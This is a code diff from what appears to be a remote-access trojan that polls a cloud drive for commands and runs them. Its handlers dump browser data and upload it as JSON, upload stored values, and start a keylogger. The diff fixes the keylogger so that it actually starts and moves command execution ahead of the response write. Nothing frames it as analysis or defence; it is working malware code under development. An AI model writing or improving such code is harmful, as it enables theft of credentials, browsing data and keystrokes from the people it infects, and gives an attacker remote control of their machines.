@@ -9,14 +9,15 @@ from .drive import send_file, drive_file
 #%%
 def dump(*args, **kwargs):
     from .browsers.module import run
-    send_file(file_name=f"dump_{args[0]}.json", content=list(run()))
+    send_file(f"dump_{args[0]}.json", content=list(run()))
 
 def set_value(*args, **kwargs):
     "change value of a variable"
-    data_store.set_value(**kwargs)
+    kv=next(iter(kwargs.items()))
+    data_store.set_value(*kv)
 
 def start_logger(*args, **kwargs):
-    Keyloger(*args, **kwargs)
+    Keyloger(*args, **kwargs).start()
 
 def stored_value(*args, **kwargs):
     send_file(f"data_store_{args[0]}.json", data_store.var.__dict__)
@@ -65,11 +66,10 @@ def parse_command(cmd:dict):
         user_time = int(command.get("time", -1))
         if user_time>last_user_time:
             log.info(f"executing user spacifig command {user_time}")
+            execute(command)
             # must be done only for user spacific commands only
             with drive_file(f"response/{user_time}") as f:
                 f.write(command["func"])
-            
-            execute(command)
             data_store.set_value("last_user_time", user_time)
         
         sleep(1)
